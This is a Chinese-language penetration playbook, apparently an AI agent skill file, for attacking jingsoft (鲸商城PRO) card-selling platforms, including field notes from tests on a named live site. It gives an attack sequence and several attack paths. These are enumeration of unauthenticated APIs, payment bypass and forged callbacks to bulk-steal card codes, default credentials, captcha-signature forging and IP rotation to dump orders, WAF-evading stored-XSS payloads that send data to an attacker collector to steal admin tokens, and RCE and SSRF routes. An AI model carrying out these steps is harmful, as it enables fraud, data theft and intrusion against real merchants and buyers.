---
name: jingsoft-merchant-platform
description: >-
  测绘引擎·鲸商城PRO（jingsoft）发卡平台渗透手册。应对云月/秋月系自动发卡平台，商家后台/支付/邀请码注册/未授权接口。
---

# jingsoft-merchant-platform（测绘引擎）

目标须在 `config/scope*.json`。本库已有专链时专卡赢。

## 真源

- 长文：`docs/learning/shizhan-pack/skills/redteam/jingsoft-merchant-platform/SKILL.md`
- 手法：`docs/playbooks/核心Web漏洞面作业手法.md`
- 工具：`python3 tools/ops/core_web_surface_probe.py --help`
- 路由：`python3 tools/ops/shizhan_pack_route.py --name jingsoft-merchant-platform`

---

# 鲸商城PRO（jingsoft）发卡平台渗透手册

> 遇到"云月商城/自动发卡平台"类目标（前端 console 泄露 `Design with by 鲸商城PRO【全新版】 https://www.jingsoft.com`）时按此手册打。这是商业发卡源码，前端 SPA + 商家后台分离，有大量可枚举 API。

## 目标判定（指纹）

```js
// merchant 后台 JS 的 console.log 泄露：
"Design with by 鲸商城PRO【全新版】 https://www.jingsoft.com"
// 技术栈：ThinkPHP + Vue3 SPA (Arco Design) + Cloudflare
// 前端资源路径：/package/shop/assets/*.js（店铺端）、/package/merchant/assets/*.js（商家端）
// 支付：对接彩虹易支付（epay.*.cn），getUserChannel 返回 Yipay/USDT/TRX/OKPAY
```

## 资产结构

| 入口 | 路径 | 说明 |
|------|------|------|
| 店铺端 SPA | `/shop/<token>` | 买家看商品/下单，token 公开（如 WMWY） |
| 商家后台 SPA | `/merchant/login` | 商家登录，JS: `/package/merchant/assets/index.*.js` |
| 商家 API | `/merchantApi/<Controller>/<action>` | 154+ 接口，大多需登录（401） |
| 店铺 API | `/shopApi/<Controller>/<action>` | 部分公开（商品列表/价格/下单） |
| 支付回调 | `/payApi/Yipay/notify`、`/payApi/Yipay/callback` | 彩虹易支付回调 |
| 插件文件 | `/zmkj-utils/params-wrapper.php` | 前端插件配置（一般无敏感信息） |

## 关键 API 清单

### 商家端（merchantApi）— 需登录
- `POST /merchantApi/user/login` — 登录，body: `{username, password}`，token 存 `merchant_token`（localStorage 365天）
- `POST /merchantApi/user/register` — 注册，需 `{username, password, repeat_password, mobile, mobile_code, email, email_code, invite_code, invite_token}`
- `POST /merchantApi/User/checkUserInviteCode` — 校验邀请码（可枚举）
- `POST /merchantApi/User/checkUserInviteToken` — 校验邀请人（返回"邀请人不存在"）
- `POST /merchantApi/user/forget` — 找回密码（用户名枚举："用户名不存在"）
- `POST /merchantApi/user/findUsername` — 找用户名（需邮箱/手机号+验证码）
- `POST /merchantApi/email/send`、`/merchantApi/sms/send` — 发验证码（需 ticket=极验 token）
- 业务：Goods/list、GoodsCardStorage/list（卡密存储）、order/list、order/exportCards（导出卡密）、payment/info（支付配置含KEY）、wallet/applyCash（提现）、Upload/file（文件上传）

### 店铺端（shopApi）— 公开
- `POST /shopApi/Shop/info` — 店铺信息（token 公开）
- `POST /shopApi/Shop/goodsList` — 商品列表 `{token, goods_type, current, pageSize}`
- `POST /shopApi/Shop/getGoodsPrice` — 价格 `{goods_key, quantity, coupon_code, channel_id}`
- `POST /shopApi/Shop/getUserChannel` — 支付通道
- `POST /shopApi/Pay/order` — 下单 `{goods_key, quantity, contact(≥6位), channel_id, ...}` → 返回 trade_no + payurl
- `POST /shopApi/Pay/query` — 查单 `{trade_no}`
- `POST /shopApi/Shop/goodsInfo` — 商品详情

### 未授权接口（重点）
- `POST /merchantApi/Upload/file` — 文件上传（multipart, 字段名 file），**不要求登录**，但源站可能 520
- `POST /merchantApi/system/config` — 系统配置（含 register.invite_code_get_url、kefu 联系方式）
- `POST /merchantApi/Common/captchaStart` — 极验初始化
- `POST /merchantApi/user/checkSafeMode` — 安全模式状态

## 注册链路（付费邀请码模式）

```bash
# 1. system/config 泄露注册配置
POST /merchantApi/system/config → register: {invite_code_get_url, is_need_invite_code:1, register_type:email, is_need_sms_verify:1}

# 2. 邀请码是付费商品！invite_code_get_url 指向的店铺卖"邀请码"卡密（如 ¥3）
#    想免费注册 → 需绕过支付拿邀请码卡密（见 rainbow-pay-submit-replay 手册）

# 3. 短信/邮箱验证码需极验 ticket，硬门槛
POST /merchantApi/sms/send {event:register, mobile, ticket} → 人机验证失败！
```

## 攻击顺序建议

1. 先拉 `merchantApi/system/config`（公开）拿注册配置/客服信息/邀请码获取地址
2. 枚举商家 API 未授权接口（Upload/file、checkSafeMode、forget 用户名枚举）
3. 免费/低价拿邀请码卡密（走支付绕过，见 rainbow-pay-submit-replay）
4. 注册商家账号 → 登录 → payment/info 拿支付密钥 → 伪造回调免付 → 批量提卡
5. 如果登录限速/锁定：等 10 分钟或换 IP

## 陷阱

- **520 全站限速**：接口探测太密会触发源站 WAF 封 IP（连 GET 都 520），停 3-5 分钟再试
- **登录频率限制**：连续错密码 → "操作频繁请10分钟后重试"，再错 → login.lock 锁定
- **人机验证**：短信/邮箱/注册都过极验（geetest），ticket 拿不到就发不了码
- **CF 前置**：域名常套 Cloudflare，zip 备份/源码路径全 403
- **商家 API 大多 401**：先批量测未授权（`{"code":1}` 或非 401 的就是金矿），别逐个手测
- **批量测接口会触发限速**：控制节奏，一次别刷太多接口

## 参考
- 支付绕过细节见 `rainbow-pay-submit-replay`（彩虹易支付回放）
- 发卡族通用支付绕过见 `faka-family-pay-bypass`


---

## 外部库增量（2026-10-11 分享包）

## 变体与硬卡点（catfk.com 实测，2026-10）

- **爱云防护 AV 层按真实 TCP IP 记账**：跳板池全部 IP 用一会即被封，`captchaStart` 直接 `RemoteDisconnected`/502 人机页。⇒ 全量拖库前先备**多个未记账出口**（新 VPS/住宅代理），一个出口只用一次。
- **每请求一张验证码票**：`Order/list`/`Order/info` 均要 ticket；真正校验端点 `POST /shopApi/common/captchaCheck.html?key=<key>`（不是 `/shopApi/captchaCheck`），`sign=MD5(MD5(code+ip)+"JING")`，`ip` 取 `captchaStart` 的 `data.ip`；须同一 Session；票不可复用。
- **买家面无枚举轴**：`Order/list` 的 `keywords` 是**精确匹配** `contact` 或 `trade_no`（非 LIKE，`%`/`_` 被转义）⇒ 拖库只能猜 contact，或用已知 contact/trade_no 定向取。
- **订单卡密**：先 `Order/list {keywords:<contact>}` 解锁 → `Order/info {trade_no, dump:1}` → `data.response.cards[]` 明文 + `export_cards_url`；`pageSize:1000` 无上限。
- **库存（未售卡）只在商户/管理端**（`GoodsCardStorage/list`、`order/exportCards`）⇒ 无 merchant/admin token 拿不到库存。
- **管理端路径闸门**：`X-Forwarded-Host ≠ 站点域名` → `code:500「请使用正确的后台路径访问」`；带任意 XFH 可穿路径段，token 段须有效票（全 124 路由无豁免）。
- **ThinkPHP 6.1.3–8.0.4 反序列化 RCE（CVE-2024-48112/44902）**，gadget 链公开但需 unserialize sink；`app_debug` 关闭时异常已 JSON 化、不吐 debug 页。
- **同族独立产品「云猫争议处理中心」**（Next.js `/api/v1/*`）：`POST /api/v1/buyer-access/order-verifications {order_no, reserved_contact}` **无需验证码**即可种会话 → `GET /api/v1/buyer/orders`；另有 `auth/merchant/login`、`auth/staff/login`；**内置默认口令 `xinghe/demo123`(merchant)、`xiaoyun/demo123`(staff) 实测可用**（demo 部署）。打同族部署先试这组口令。
- **平台自曝**：买家侧匿名可取 `shopApi/system/config` 与 `cz_scfg.json`（平台名/抽点/运营主体/客服 QQ/`site_close_tip`）。

## 管理端 API 面与上传口（实测·鲸商城PRO，2026-10）

- **管理端 SPA = 3 个 JS**：`index.html` 只引 `/package/admin/static/js/{element-plus.<h>,app.<h>,977.<h>}.js` + 4 个 `vab-chunk-*`（无视图分包，别浪费时间找 chunk 表）。
- **API 命名空间 = `/adminApi/manage.<Controller>/<action>`**；全量字面量 **25 个**：`auth×4`、`router/getList`、`System/config`、`SystemMenu×7`、`manage.Dashboard×3`、`manage.PluginLocal×8`（`category/list/detail/uninstall/paramsUpdate/menuList/setMenu/setMenuSort`）。**唯一写配置原语 = `PluginLocal/paramsUpdate`**（拿票后优先实测）。
- **上传口是动态路径 `/adminApi/Upload/${type}`**（组件内带 `token` 参数）：**`/Upload/image` 走 gate（需票）**，**`/Upload/file` 免登录可用**。
- **上传落点定性（实测）**：返回 `https://static.<域>/<2hex>/<md5>.png`（**文件名=内容 md5，不可控**）；同一路径用站点域名/源站取 ⇒ **404**，仅 COS 域 200 ⇒ **本地无副本、不执行**。
- **后缀双闸门**：① 宝塔 WAF 直接断连一切**含 `php` 的文件名**（`.php/.php5/.php7/.phar/.pHp/.htaccess/.user.ini`）；② 服务端白名单只放 `jpg/jpeg/png/gif/mp3`，其余返 `文件类型受限，请在后台配置规则！`（⇒ 白名单**后台可配**）。
- **⇒ 上传→RCE 判死**。RCE 三步：① 拿 `admin-token`（存储型 XSS 武器/社工）→ ② 枚举写文件原语（`PluginLocal/paramsUpdate`、云端插件市场 install/upload、存储驱动切本地+白名单）→ ③ 过 WAF/Nginx 解析墙（Nginx+FPM 只解析 `\.php$`）。**支线 = 宝塔 SSRF**（`[::ffff:127.0.0.1]:28842` 可达，缺面板口令 ⇒ 一旦得手建计划任务即 RCE）。

## 插件存储型 XSS 武器链（catfk.com 已端到端打通，2026-10）

当目标装了 **`Storeannouncements`（购买页面弹窗提示）** 插件且拿不到任意后台票时，这是唯一可行的"拿管理员"路径。

- **注入点**：买家侧 `Storeann.js` 的 `createAnnouncementModal()` —— `modal.innerHTML = \`...<div class="announcement-content">${content}</div>...\``，`content`=服务端 `announcement` 字段**零转义** ⇒ DOM XSS 定证。
- **投递契约**：`POST /plugin/Storeannouncements/api/save`，body `{"announcement","title","frequency":"once","read_enabled":1,"status":1,"close_delay",0,"button_color"}`（字段名是 `announcement` 不是 `content`；`frequency` 值域错会报"弹出频率设置不正确"）；鉴权 = **商户会话**（`Merchant-Token` 头 + 登录 cookie 都要）。
- **权威读回**：`POST .../api/fetchData` **必须带本店登录会话**（裸 HTTP 读返 `未找到商家信息`）；比对服务端存储字节 == 投递字节才算上线成功。
- **宝塔 WAF 逃生口 = `setTimeout('<字符串>',0)`** —— WAF 是「taint 传播 + 语义识别 + 黑名单 token」混合体；`eval(`/`atob(`/`getItem(`/`createElement`/`self[`/字面键 `X['k']` 一律拦（字符串内也扫），但 `setTimeout` 的**字符串参数对 WAF 不透明**。载荷定型：`<img/onerror="setTimeout('...',0)" src=q>`（HTML 属性用双引号、JS 里引号写 `\x27`）。
- **外带 vs mixed-content**：https 站不能 http 子资源外带 ⇒ 用**顶层导航** `location='http://<collector>/x?d='+s`；收集器**先落日志再 302 弹回店铺页**（受害者无感）。
- **命中面**：管理端 SPA 不做数据绑定 `innerHTML`、也无公告 admin 页（404）⇒ **无"管理员开件即中招"**，只有"持票者访问店铺页"这一环；已登录商家的公告编辑器（`/plugin/Storeannouncements/Api/index`，无票 401）是次要触发点。
- **adminApi gate 复检**：`/adminApi/SystemMenu/all` 等随 `Host` 变 —— `Host: 站点域` → `请使用正确的后台路径访问`；其它 Host → `系统未授权或已过期`；非 IP/Referer/Origin/XFF 判定；不存在路由返 404 ⇒ 是**鉴权中间件的文案**，拿真 `admin-token` 后应即开锁。免鉴权仅 `System/config`+`auth/login`。
- **可逆性**：目标侧唯一改动 = 公告字段 ⇒ 一条 `save`（`announcement:""`、`status:0`）复原；接口日志平台侧留存不可清。

### 武器化作业纪律（踩过的坑）
- **自测回执必须与第三方命中分开记账**：自家浏览器验证会往 `/root/coll.log` 写回执（出口 IP 固定 + 合成标记如 `NEWPAY_*`），**别把它当"真实访客中招"**；报战果前先按 IP/标记剔除自测条目。
- **"过 WAF + 落库" ≠ "会执行"**：必须浏览器实机 fire 验证（`render_test.html` 本地 + 真站无票访问各一次），两类假阳性——`/` 被吸进未加引号的前属性值、JS 含空格被属性值截断（`var o`）——都要排除。
- **改任何已上线载荷前先存旧值**（还原脚本 `pt_undeploy.py`：先 fetchData 存档 → save 新值 → 读回确认）。
